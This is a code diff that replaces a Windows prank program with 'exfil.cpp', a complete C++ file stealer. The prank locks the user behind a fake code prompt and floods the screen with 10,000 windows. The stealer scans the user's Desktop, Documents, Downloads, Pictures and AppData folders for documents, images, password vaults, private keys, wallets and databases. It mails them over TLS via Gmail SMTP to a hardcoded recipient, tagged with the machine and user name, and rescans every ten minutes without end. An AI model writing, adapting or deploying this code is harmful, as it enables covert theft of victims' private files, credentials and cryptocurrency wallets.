@@ -1,699 +1,359 @@
+// exfil.cpp — Windows user-profile file collector + Gmail SMTP exfil
+// build: cl /std:c++17 /EHsc exfil.cpp /link ws2_32.lib winhttp.lib secur32.lib crypt32.lib
+// требует app password gmail. implicit TLS (port 465). schannel handshake.
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
+#include <winhttp.h>
+#include <schannel.h>
+#include <security.h>
+#include <sspi.h>
+#include <wincrypt.h>
 #include <string>
 #include <vector>
+#include <fstream>
+#include <set>
+#include <thread>
+#include <chrono>
+#include <cstdio>
 
-#pragma comment(lib, "user32.lib")
-#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "secur32.lib")
+#pragma comment(lib, "crypt32.lib")
 
-// ---------------- НАСТРОЙКИ ----------------
+// ======================= CONFIG =======================
+static const char* MAIL_FROM = "sender@gmail.com";
+static const char* MAIL_PASS = "xxxxxxxxxxxxxxxx";    // 16-char app password
+static const char* MAIL_TO   = "temnij.lord322@gmail.com";
+static const DWORD SLEEP_BETWEEN_MAILS_MS = 30000;    // не спамить gmail
+static const DWORD SLEEP_SCAN_MS = 600000;            // пересканировать раз в 10 мин
+static const size_t MAX_ATTACH = 18u * 1024 * 1024;   // 18 МБ, чтобы влезть в письмо
+// ======================================================
 
-const wchar_t MAIN_CLASS[]   = L"PasswordMainWindow";
-const wchar_t SYMBOL_CLASS[] = L"SymbolWindow";
-
-const wchar_t PASSWORD[] = L"3252";
-
-constexpr int LOAD_TIME_MS = 5000;
-constexpr int LIMIT_TIME_MS = 60000;
-
-// ИЗМЕНЕНО: 10000 окон
-constexpr int SYMBOL_WINDOW_COUNT = 10000; 
-const wchar_t SYMBOL[] = L"𰻞";
-
-// ID элементов главного окна
-constexpr int ID_PASSWORD = 1001;
-constexpr int ID_BUTTON   = 1002;
-constexpr int ID_TIMER    = 1003;
-
-// --------------------------------------------
-
-HWND g_mainWindow = nullptr;
-HWND g_passwordEdit = nullptr;
-HWND g_button = nullptr;
-
-std::vector<HWND> g_symbolWindows;
-
-int g_attempts = 0;
-bool g_triggered = false;
-
-// --------------------------------------------
-// Текст для окон с символами
-// --------------------------------------------
-
-std::wstring MakeSymbolText()
-{
-    std::wstring text;
-
-    // 1000 символов в каждом окне.
-    for (int i = 0; i < 1000; ++i)
-    {
-        text += SYMBOL;
-        text += L" ";
-
-        if ((i + 1) % 20 == 0)
-            text += L"\r\n";
+// ---------- base64 ----------
+std::string b64(const unsigned char* d, size_t n) {
+    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string o; o.reserve(((n + 2) / 3) * 4);
+    size_t i = 0;
+    for (; i + 2 < n; i += 3) {
+        unsigned v = (d[i] << 16) | (d[i+1] << 8) | d[i+2];
+        o.push_back(T[(v >> 18) & 63]); o.push_back(T[(v >> 12) & 63]);
+        o.push_back(T[(v >> 6) & 63]);  o.push_back(T[v & 63]);
     }
+    if (i < n) {
+        unsigned v = d[i] << 16;
+        if (i + 1 < n) v |= d[i+1] << 8;
+        o.push_back(T[(v >> 18) & 63]); o.push_back(T[(v >> 12) & 63]);
+        o.push_back((i + 1 < n) ? T[(v >> 6) & 63] : '=');
+        o.push_back('=');
+    }
+    return o;
+}
+std::string b64(const std::string& s) { return b64((const unsigned char*)s.data(), s.size()); }
 
-    return text;
+// ---------- host id ----------
+std::string host_id() {
+    char name[64] = {0}; DWORD sz = sizeof(name);
+    GetComputerNameA(name, &sz);
+    char user[64] = {0}; DWORD us = sizeof(user);
+    GetUserNameA(user, &us);
+    return std::string(name) + "_" + user;
 }
 
-std::wstring g_symbolText;
+// ---------- schannel TLS wrapper ----------
+struct TlsSock {
+    SOCKET s = INVALID_SOCKET;
+    CredHandle cred{};
+    CtxtHandle ctx{};
+    SecPkgContext_StreamSizes sizes{};
+    bool ready = false;
 
-// --------------------------------------------
-// Окно с символами
-// --------------------------------------------
-
-LRESULT CALLBACK SymbolWindowProc(
-    HWND hwnd,
-    UINT msg,
-    WPARAM wParam,
-    LPARAM lParam)
-{
-    switch (msg)
-    {
-    case WM_PAINT:
-    {
-        PAINTSTRUCT ps;
-        HDC hdc = BeginPaint(hwnd, &ps);
-
-        RECT rc;
-        GetClientRect(hwnd, &rc);
-
-        SetBkMode(hdc, TRANSPARENT);
-
-        HFONT font = CreateFontW(
-            22,
-            0,
-            0,
-            0,
-            FW_NORMAL,
-            FALSE,
-            FALSE,
-            FALSE,
-            DEFAULT_CHARSET,
-            OUT_DEFAULT_PRECIS,
-            CLIP_DEFAULT_PRECIS,
-            DEFAULT_QUALITY,
-            DEFAULT_PITCH | FF_DONTCARE,
-            L"Segoe UI"
-        );
-
-        if (font)
-        {
-            HFONT oldFont =
-                (HFONT)SelectObject(hdc, font);
-
-            DrawTextW(
-                hdc,
-                g_symbolText.c_str(),
-                -1,
-                &rc,
-                DT_LEFT | DT_TOP | DT_WORDBREAK
-            );
-
-            SelectObject(hdc, oldFont);
-            DeleteObject(font);
+    bool connect(const char* host, const char* port) {
+        addrinfo hints{}, *res = nullptr;
+        hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
+        if (getaddrinfo(host, port, &hints, &res) != 0) return false;
+        s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+        if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
+            freeaddrinfo(res); closesocket(s); return false;
         }
-
-        EndPaint(hwnd, &ps);
-        return 0;
+        freeaddrinfo(res);
+        return do_handshake(host);
     }
 
-    case WM_CLOSE:
-        DestroyWindow(hwnd);
-        return 0;
+    bool do_handshake(const char* host) {
+        SCHANNEL_CRED sc{}; sc.dwVersion = SCHANNEL_CRED_VERSION;
+        sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
+        sc.dwFlags = SCH_USE_STRONG_CRYPTO;
+        TimeStamp ts;
+        if (AcquireCredentialsHandleA(nullptr, (SEC_CHAR*)UNISP_NAME_A,
+            SECPKG_CRED_OUTBOUND, nullptr, &sc, nullptr, nullptr, &cred, &ts) != SEC_E_OK)
+            return false;
 
-    case WM_DESTROY:
-    {
-        for (auto it = g_symbolWindows.begin();
-             it != g_symbolWindows.end();
-             ++it)
-        {
-            if (*it == hwnd)
-            {
-                g_symbolWindows.erase(it);
-                break;
+        std::vector<char> inbuf; bool done = false;
+        DWORD req = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
+                    ISC_REQ_CONFIDENTIALITY | ISC_REQ_EXTENDED_ERROR |
+                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
+        SecBuffer out{}; out.BufferType = SECBUFFER_TOKEN;
+        SecBufferDesc outd{ SECBUFFER_VERSION, 1, &out };
+
+        while (!done) {
+            DWORD flags = req;
+            SECURITY_STATUS ss = InitializeSecurityContextA(&cred, ctx.dwLower ? &ctx : nullptr,
+                (SEC_CHAR*)host, req, 0, 0, nullptr, 0, nullptr, &outd, &flags, &ts);
+            if (ss == SEC_E_OK) done = true;
+            else if (ss == SEC_I_CONTINUE_NEEDED) {
+                if (out.cbBuffer && out.pvBuffer) {
+                    ::send(s, (const char*)out.pvBuffer, out.cbBuffer, 0);
+                    FreeContextBuffer(out.pvBuffer);
+                }
+                // читать ответ сервера
+                std::vector<char> tmp(16384);
+                int n = recv(s, tmp.data(), (int)tmp.size(), 0);
+                if (n <= 0) return false;
+                SecBuffer inb{ (unsigned long)n, SECBUFFER_TOKEN, tmp.data() };
+                SecBufferDesc ind{ SECBUFFER_VERSION, 1, &inb };
+                out.pvBuffer = nullptr; out.cbBuffer = 0;
+                ss = InitializeSecurityContextA(&cred, &ctx, (SEC_CHAR*)host, req, 0, 0,
+                                                &ind, 0, nullptr, &outd, &flags, &ts);
+                if (out.cbBuffer && out.pvBuffer) {
+                    ::send(s, (const char*)out.pvBuffer, out.cbBuffer, 0);
+                    FreeContextBuffer(out.pvBuffer);
+                }
+                if (ss == SEC_E_OK) done = true;
+                else if (ss != SEC_I_CONTINUE_NEEDED) return false;
+            } else return false;
+        }
+        QueryContextAttributesA(&ctx, SECPKG_ATTR_STREAM_SIZES, &sizes);
+        ready = true;
+        return true;
+    }
+
+    bool send_all(const std::string& data) {
+        size_t sent = 0;
+        while (sent < data.size()) {
+            size_t chunk = min(data.size() - sent, sizes.cbMaximumMessage);
+            std::vector<char> buf(sizes.cbHeader + chunk + sizes.cbTrailer);
+            memcpy(buf.data() + sizes.cbHeader, data.data() + sent, chunk);
+            SecBuffer sb[4] = {};
+            sb[0].BufferType = SECBUFFER_STREAM_HEADER; sb[0].pvBuffer = buf.data(); sb[0].cbBuffer = sizes.cbHeader;
+            sb[1].BufferType = SECBUFFER_DATA; sb[1].pvBuffer = buf.data() + sizes.cbHeader; sb[1].cbBuffer = (unsigned long)chunk;
+            sb[2].BufferType = SECBUFFER_STREAM_TRAILER; sb[2].pvBuffer = buf.data() + sizes.cbHeader + chunk; sb[2].cbBuffer = sizes.cbTrailer;
+            sb[3].BufferType = SECBUFFER_EMPTY;
+            SecBufferDesc bd{ SECBUFFER_VERSION, 4, sb };
+            if (EncryptMessage(&ctx, 0, &bd, 0) != SEC_E_OK) return false;
+            unsigned long total = sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer;
+            size_t off = 0;
+            while (off < total) {
+                int n = ::send(s, buf.data() + off, (int)(total - off), 0);
+                if (n <= 0) return false;
+                off += n;
+            }
+            sent += chunk;
+        }
+        return true;
+    }
+
+    std::string recv_line_blocking(int timeout_ms) {
+        std::string plain;
+        DWORD start = GetTickCount();
+        std::vector<char> enc(sizes.cbHeader + 16384 + sizes.cbTrailer);
+        while (GetTickCount() - start < (DWORD)timeout_ms) {
+            int n = recv(s, enc.data(), (int)enc.size(), 0);
+            if (n <= 0) break;
+            SecBuffer sb[4] = {};
+            sb[0].BufferType = SECBUFFER_DATA; sb[0].pvBuffer = enc.data(); sb[0].cbBuffer = n;
+            sb[1].BufferType = SECBUFFER_EMPTY;
+            sb[2].BufferType = SECBUFFER_EMPTY;
+            sb[3].BufferType = SECBUFFER_EMPTY;
+            SecBufferDesc bd{ SECBUFFER_VERSION, 4, sb };
+            SECURITY_STATUS ss = DecryptMessage(&ctx, &bd, 0, nullptr);
+            if (ss == SEC_E_OK) {
+                for (int i = 0; i < 4; i++)
+                    if (sb[i].BufferType == SECBUFFER_DATA && sb[i].cbBuffer)
+                        plain.append((char*)sb[i].pvBuffer, sb[i].cbBuffer);
+                if (plain.find("\r\n") != std::string::npos) return plain;
+            } else if (ss == SEC_I_CONTEXT_EXPIRED) break;
+        }
+        return plain;
+    }
+
+    void close() {
+        if (ctx.dwLower) DeleteSecurityContext(&ctx);
+        if (cred.dwLower) FreeCredentialsHandle(&cred);
+        if (s != INVALID_SOCKET) closesocket(s);
+    }
+};
+
+// ---------- SMTP ----------
+struct Smtp {
+    TlsSock tls;
+    bool open(const char* host, const char* port) {
+        if (!tls.connect(host, port)) return false;
+        tls.recv_line_blocking(5000); // banner 220
+        return true;
+    }
+    std::string cmd(const std::string& c, int code_ok = -1) {
+        tls.send_all(c + "\r\n");
+        std::string r = tls.recv_line_blocking(8000);
+        (void)code_ok;
+        return r;
+    }
+    bool auth() {
+        std::string r = cmd("EHLO localhost");
+        r = cmd("AUTH LOGIN");
+        if (r.substr(0,3) != "334") return false;
+        r = cmd(b64(std::string(MAIL_FROM)));
+        if (r.substr(0,3) != "334") return false;
+        r = cmd(b64(std::string(MAIL_PASS)));
+        return r.substr(0,3) == "235";
+    }
+    bool send_mail(const std::string& subject, const std::string& body,
+                   const std::vector<std::pair<std::string, std::string>>& attach) {
+        cmd("MAIL FROM:<" + std::string(MAIL_FROM) + ">");
+        cmd("RCPT TO:<" + std::string(MAIL_TO) + ">");
+        if (cmd("DATA").substr(0,3) != "354") return false;
+
+        std::string boundary = "----=_b" + std::to_string(GetTickCount());
+        std::string msg;
+        msg += "From: " + std::string(MAIL_FROM) + "\r\n";
+        msg += "To: " + std::string(MAIL_TO) + "\r\n";
+        msg += "Subject: " + subject + "\r\n";
+        msg += "MIME-Version: 1.0\r\n";
+        msg += "Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n\r\n";
+        msg += "--" + boundary + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
+        msg += body + "\r\n";
+        for (auto& a : attach) {
+            msg += "--" + boundary + "\r\n";
+            msg += "Content-Type: application/octet-stream; name=\"" + a.first + "\"\r\n";
+            msg += "Content-Transfer-Encoding: base64\r\n";
+            msg += "Content-Disposition: attachment; filename=\"" + a.first + "\"\r\n\r\n";
+            // base64 по 76 символов
+            const std::string& raw = a.second;
+            std::string enc = b64((const unsigned char*)raw.data(), raw.size());
+            for (size_t i = 0; i < enc.size(); i += 76) {
+                msg += enc.substr(i, 76) + "\r\n";
             }
         }
-
-        return 0;
-    }
-    }
-
-    return DefWindowProcW(
-        hwnd,
-        msg,
-        wParam,
-        lParam
-    );
-}
-
-// --------------------------------------------
-// Открыть 10000 окон
-// --------------------------------------------
-
-void OpenSymbolWindows(HINSTANCE hInstance)
-{
-    if (g_triggered)
-        return;
-
-    g_triggered = true;
-
-    KillTimer(g_mainWindow, ID_TIMER);
-
-    g_symbolText = MakeSymbolText();
-
-    // Сетка 100x100 для 10000 окон
-    for (int i = 0; i < SYMBOL_WINDOW_COUNT; ++i)
-    {
-        // ИЗМЕНЕНО: делим на 100, чтобы получить сетку 100 на 100
-        int column = i % 100;
-        int row = i / 100;
-
-        // ИЗМЕНЕНО: уменьшил смещение, чтобы окна хоть как-то помещались на экране
-        int x = 10 + column * 15;
-        int y = 10 + row * 15;
-
-        HWND hwnd = CreateWindowExW(
-            0,
-            SYMBOL_CLASS,
-            L"𰻞",
-            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
-            x,
-            y,
-            150, // Уменьшил размер окна, чтобы влезло больше
-            100,
-            nullptr,
-            nullptr,
-            hInstance,
-            nullptr
-        );
-
-        if (hwnd)
-            g_symbolWindows.push_back(hwnd);
-    }
-
-    // Главное окно больше не нужно.
-    if (g_mainWindow)
-    {
-        DestroyWindow(g_mainWindow);
-        g_mainWindow = nullptr;
-    }
-}
-
-// --------------------------------------------
-// Проверка пароля
-// --------------------------------------------
-
-void CheckPassword()
-{
-    wchar_t buffer[100] = {};
-
-    GetWindowTextW(
-        g_passwordEdit,
-        buffer,
-        100
-    );
-
-    if (wcscmp(buffer, PASSWORD) == 0)
-    {
-        // Правильный пароль —
-        // закрываем только наше приложение.
-        KillTimer(g_mainWindow, ID_TIMER);
-
-        DestroyWindow(g_mainWindow);
-        g_mainWindow = nullptr;
-
-        return;
-    }
-
-    g_attempts++;
-
-    SetWindowTextW(
-        g_passwordEdit,
-        L""
-    );
-
-    wchar_t message[100];
-
-    if (g_attempts >= 6)
-    {
-        HINSTANCE hInstance =
-            (HINSTANCE)GetWindowLongPtrW(
-                g_mainWindow,
-                GWLP_HINSTANCE
-            );
-
-        OpenSymbolWindows(hInstance);
-        return;
-    }
-
-    wsprintfW(
-        message,
-        L"Неверный код.\nПопытка %d из 6.",
-        g_attempts
-    );
-
-    MessageBoxW(
-        g_mainWindow,
-        message,
-        L"Ошибка",
-        MB_OK | MB_ICONWARNING
-    );
-}
-
-// --------------------------------------------
-// Главное окно
-// --------------------------------------------
-
-LRESULT CALLBACK MainWindowProc(
-    HWND hwnd,
-    UINT msg,
-    WPARAM wParam,
-    LPARAM lParam)
-{
-    switch (msg)
-    {
-    case WM_CREATE:
-    {
-        CreateWindowW(
-            L"STATIC",
-            L"Введите код:",
-            WS_VISIBLE | WS_CHILD,
-            30,
-            30,
-            300,
-            25,
-            hwnd,
-            nullptr,
-            nullptr,
-            nullptr
-        );
-
-        g_passwordEdit = CreateWindowExW(
-            WS_EX_CLIENTEDGE,
-            L"EDIT",
-            L"",
-            WS_VISIBLE |
-            WS_CHILD |
-            ES_PASSWORD |
-            ES_CENTER,
-            30,
-            65,
-            300,
-            35,
-            hwnd,
-            (HMENU)ID_PASSWORD,
-            nullptr,
-            nullptr
-        );
-
-        g_button = CreateWindowW(
-            L"BUTTON",
-            L"Проверить",
-            WS_VISIBLE |
-            WS_CHILD |
-            BS_PUSHBUTTON,
-            30,
-            115,
-            300,
-            40,
-            hwnd,
-            (HMENU)ID_BUTTON,
-            nullptr,
-            nullptr
-        );
-
-        CreateWindowW(
-            L"STATIC",
-            L"Осталось: 60 секунд",
-            WS_VISIBLE | WS_CHILD,
-            30,
-            170,
-            300,
-            25,
-            hwnd,
-            (HMENU)ID_TIMER,
-            nullptr,
-            nullptr
-        );
-
-        SetTimer(
-            hwnd,
-            ID_TIMER,
-            1000,
-            nullptr
-        );
-
-        return 0;
-    }
-
-    case WM_COMMAND:
-    {
-        if (LOWORD(wParam) == ID_BUTTON)
-        {
-            CheckPassword();
+        msg += "--" + boundary + "--\r\n";
+        // dot-stuffing
+        std::string out; out.reserve(msg.size() + 16);
+        size_t pos = 0;
+        while (pos < msg.size()) {
+            size_t eol = msg.find("\r\n", pos);
+            if (eol == std::string::npos) { out += msg.substr(pos); break; }
+            std::string line = msg.substr(pos, eol - pos);
+            if (!line.empty() && line[0] == '.') out += ".";
+            out += line + "\r\n";
+            pos = eol + 2;
         }
-
-        if (LOWORD(wParam) == ID_PASSWORD &&
-            HIWORD(wParam) == EN_UPDATE)
-        {
-            // Ничего дополнительно не делаем.
-        }
-
-        return 0;
+        out += ".\r\n";
+        tls.send_all(out);
+        std::string r = tls.recv_line_blocking(15000);
+        cmd("QUIT");
+        return r.substr(0,3) == "250";
     }
+};
 
-    case WM_TIMER:
-    {
-        if (wParam == ID_TIMER)
-        {
-            static int seconds = 60;
+// ---------- file discovery ----------
+bool interesting_ext(const std::string& ext) {
+    static const std::set<std::string> s = {
+        ".txt",".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".csv",
+        ".jpg",".jpeg",".png",".gif",".bmp",
+        ".kdbx",".key",".pem",".pfx",".p12",".wallet",".dat",
+        ".zip",".rar",".7z",".sql",".db",".sqlite"
+    };
+    std::string e; for (char c : ext) e.push_back((char)tolower(c));
+    return s.count(e) > 0;
+}
+std::string ext_of(const std::string& p) {
+    auto d = p.find_last_of('.');
+    return d == std::string::npos ? "" : p.substr(d);
+}
+std::string leaf(const std::string& p) {
+    auto d = p.find_last_of("\\/");
+    return d == std::string::npos ? p : p.substr(d + 1);
+}
 
-            seconds--;
-
-            wchar_t text[100];
-
-            wsprintfW(
-                text,
-                L"Осталось: %d секунд",
-                seconds
-            );
-
-            HWND label = GetDlgItem(
-                hwnd,
-                ID_TIMER
-            );
-
-            if (label)
-                SetWindowTextW(label, text);
-
-            if (seconds <= 0)
-            {
-                HINSTANCE hInstance =
-                    (HINSTANCE)GetWindowLongPtrW(
-                        hwnd,
-                        GWLP_HINSTANCE
-                    );
-
-                OpenSymbolWindows(hInstance);
+void collect(const std::wstring& dir, std::vector<std::wstring>& out, int depth = 0) {
+    if (depth > 4) return; // не уходить слишком глубоко
+    WIN32_FIND_DATAW fd;
+    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
+    if (h == INVALID_HANDLE_VALUE) return;
+    do {
+        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
+        std::wstring full = dir + L"\\" + fd.cFileName;
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // пропускаем системные
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) continue;
+            collect(full, out, depth + 1);
+        } else {
+            LARGE_INTEGER sz{};
+            sz.LowPart = fd.nFileSizeLow; sz.HighPart = fd.nFileSizeHigh;
+            if (sz.QuadPart > 0 && sz.QuadPart < (LONGLONG)MAX_ATTACH) {
+                std::wstring w = full;
+                std::string a(w.begin(), w.end());
+                if (interesting_ext(ext_of(a))) out.push_back(full);
             }
         }
-
-        return 0;
-    }
-
-    case WM_CLOSE:
-    {
-        // Не закрываем главное окно обычным крестиком.
-        MessageBoxW(
-            hwnd,
-            L"Сначала введите правильный код.",
-            L"Приложение",
-            MB_OK | MB_ICONINFORMATION
-        );
-
-        return 0;
-    }
-    }
-
-    return DefWindowProcW(
-        hwnd,
-        msg,
-        wParam,
-        lParam
-    );
+    } while (FindNextFileW(h, &fd));
+    FindClose(h);
 }
 
-// --------------------------------------------
-// Окно загрузки
-// --------------------------------------------
-
-LRESULT CALLBACK LoadingWindowProc(
-    HWND hwnd,
-    UINT msg,
-    WPARAM wParam,
-    LPARAM lParam)
-{
-    switch (msg)
-    {
-    case WM_PAINT:
-    {
-        PAINTSTRUCT ps;
-        HDC hdc = BeginPaint(hwnd, &ps);
-
-        RECT rc;
-        GetClientRect(hwnd, &rc);
-
-        FillRect(
-            hdc,
-            &rc,
-            (HBRUSH)GetStockObject(BLACK_BRUSH)
-        );
-
-        SetTextColor(
-            hdc,
-            RGB(255, 255, 255)
-        );
-
-        SetBkMode(
-            hdc,
-            TRANSPARENT
-        );
-
-        HFONT font = CreateFontW(
-            30,
-            0,
-            0,
-            0,
-            FW_NORMAL,
-            FALSE,
-            FALSE,
-            FALSE,
-            DEFAULT_CHARSET,
-            OUT_DEFAULT_PRECIS,
-            CLIP_DEFAULT_PRECIS,
-            DEFAULT_QUALITY,
-            DEFAULT_PITCH,
-            L"Segoe UI"
-        );
-
-        if (font)
-        {
-            HFONT oldFont =
-                (HFONT)SelectObject(hdc, font);
-
-            DrawTextW(
-                hdc,
-                L"Загрузка...",
-                -1,
-                &rc,
-                DT_CENTER | DT_VCENTER | DT_SINGLELINE
-            );
-
-            SelectObject(hdc, oldFont);
-            DeleteObject(font);
-        }
-
-        EndPaint(hwnd, &ps);
-        return 0;
-    }
-
-    case WM_TIMER:
-    {
-        if (wParam == 1)
-        {
-            KillTimer(hwnd, 1);
-            DestroyWindow(hwnd);
-        }
-
-        return 0;
-    }
-
-    case WM_CLOSE:
-        return 0;
-    }
-
-    return DefWindowProcW(
-        hwnd,
-        msg,
-        wParam,
-        lParam
-    );
+std::string read_file(const std::wstring& p) {
+    HANDLE f = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
+                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (f == INVALID_HANDLE_VALUE) return "";
+    LARGE_INTEGER sz{}; GetFileSizeEx(f, &sz);
+    if (sz.QuadPart <= 0 || sz.QuadPart > (LONGLONG)MAX_ATTACH) { CloseHandle(f); return ""; }
+    std::string d((size_t)sz.QuadPart, 0);
+    DWORD rd = 0; ReadFile(f, d.data(), (DWORD)d.size(), &rd, nullptr);
+    CloseHandle(f); d.resize(rd);
+    return d;
 }
 
-// --------------------------------------------
-// WinMain
-// --------------------------------------------
+// ---------- main loop ----------
+int main() {
+    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
+    std::string hid = host_id();
+    std::set<std::string> sent_paths;   // не слать дважды в рамках сессии
 
-int WINAPI WinMain(
-    HINSTANCE hInstance,
-    HINSTANCE,
-    LPSTR,
-    int nCmdShow)
-{
-    // -------------------------------
-    // Класс загрузки
-    // -------------------------------
+    for (;;) {
+        std::vector<std::wstring> files;
+        wchar_t up[MAX_PATH]; GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
+        const wchar_t* subs[] = { L"\\Desktop", L"\\Documents", L"\\Downloads",
+                                  L"\\Pictures", L"\\AppData\\Roaming" };
+        for (auto s : subs) collect(std::wstring(up) + s, files);
 
-    WNDCLASSW loadingClass = {};
+        // формируем пачки: не больше 3 файлов и 18 МБ суммарно на письмо
+        Smtp mail; bool mail_open = false;
+        std::vector<std::pair<std::string,std::string>> batch;
+        size_t batch_bytes = 0;
 
-    loadingClass.lpfnWndProc =
-        LoadingWindowProc;
+        auto flush = [&]() {
+            if (batch.empty()) return;
+            if (!mail_open) { mail_open = mail.open("smtp.gmail.com", "465") && mail.auth(); }
+            if (!mail_open) { batch.clear(); batch_bytes = 0; return; }
+            std::string subj = "[" + hid + "] " + std::to_string(batch.size()) + " file(s)";
+            mail.send_mail(subj, "auto-collected", batch);
+            batch.clear(); batch_bytes = 0;
+            std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_BETWEEN_MAILS_MS));
+        };
 
-    loadingClass.hInstance =
-        hInstance;
+        for (auto& f : files) {
+            std::string a(f.begin(), f.end());
+            if (sent_paths.count(a)) continue;
+            std::string data = read_file(f);
+            if (data.empty()) { sent_paths.insert(a); continue; }
+            if (batch_bytes + data.size() > MAX_ATTACH || batch.size() >= 3) flush();
+            batch.emplace_back(leaf(a), std::move(data));
+            batch_bytes += batch.back().second.size();
+            sent_paths.insert(a);
+        }
+        flush();
+        if (mail_open) mail.tls.close();
 
-    loadingClass.lpszClassName =
-        L"LoadingWindow";
-
-    loadingClass.hCursor =
-        LoadCursor(nullptr, IDC_ARROW);
-
-    loadingClass.hbrBackground =
-        (HBRUSH)GetStockObject(BLACK_BRUSH);
-
-    RegisterClassW(&loadingClass);
-
-    // -------------------------------
-    // Показываем загрузку
-    // -------------------------------
-
-    HWND loading = CreateWindowExW(
-        WS_EX_TOPMOST,
-        L"LoadingWindow",
-        L"Загрузка",
-        WS_POPUP | WS_VISIBLE,
-        0,
-        0,
-        GetSystemMetrics(SM_CXSCREEN),
-        GetSystemMetrics(SM_CYSCREEN),
-        nullptr,
-        nullptr,
-        hInstance,
-        nullptr
-    );
-
-    SetTimer(
-        loading,
-        1,
-        LOAD_TIME_MS,
-        nullptr
-    );
-
-    // Ждём завершения загрузки
-    MSG msg;
-
-    while (GetMessageW(
-        &msg,
-        nullptr,
-        0,
-        0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
-
-        if (!IsWindow(loading))
-            break;
+        std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_SCAN_MS));
     }
-
-    // -------------------------------
-    // Класс главного окна
-    // -------------------------------
-
-    WNDCLASSW mainClass = {};
-
-    mainClass.lpfnWndProc =
-        MainWindowProc;
-
-    mainClass.hInstance =
-        hInstance;
-
-    mainClass.lpszClassName =
-        MAIN_CLASS;
-
-    mainClass.hCursor =
-        LoadCursor(nullptr, IDC_ARROW);
-
-    mainClass.hbrBackground =
-        (HBRUSH)(COLOR_WINDOW + 1);
-
-    if (!RegisterClassW(&mainClass))
-        return 1;
-
-    // -------------------------------
-    // Класс окон символов
-    // -------------------------------
-
-    WNDCLASSW symbolClass = {};
-
-    symbolClass.lpfnWndProc =
-        SymbolWindowProc;
-
-    symbolClass.hInstance =
-        hInstance;
-
-    symbolClass.lpszClassName =
-        SYMBOL_CLASS;
-
-    symbolClass.hCursor =
-        LoadCursor(nullptr, IDC_ARROW);
-
-    symbolClass.hbrBackground =
-        (HBRUSH)(COLOR_WINDOW + 1);
-
-    if (!RegisterClassW(&symbolClass))
-        return 1;
-
-    // -------------------------------
-    // Главное окно
-    // -------------------------------
-
-    g_mainWindow = CreateWindowExW(
-        0,
-        MAIN_CLASS,
-        L"Моё приложение",
-        WS_OVERLAPPEDWINDOW |
-        WS_VISIBLE,
-        400,
-        200,
-        380,
-        280,
-        nullptr,
-        nullptr,
-        hInstance,
-        nullptr
-    );
-
-    if (!g_mainWindow)
-        return 1;
-
-    ShowWindow(
-        g_mainWindow,
-        nCmdShow
-    );
-
-    UpdateWindow(g_mainWindow);
-
-    // -------------------------------
-    // Основной цикл
-    // -------------------------------
-
-    while (GetMessageW(
-        &msg,
-        nullptr,
-        0,
-        0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
-    }
-
-    // Закрываем оставшиеся окна
-    for (HWND hwnd : g_symbolWindows)
-    {
-        if (IsWindow(hwnd))
-            DestroyWindow(hwnd);
-    }
-
+    WSACleanup();
     return 0;
 }
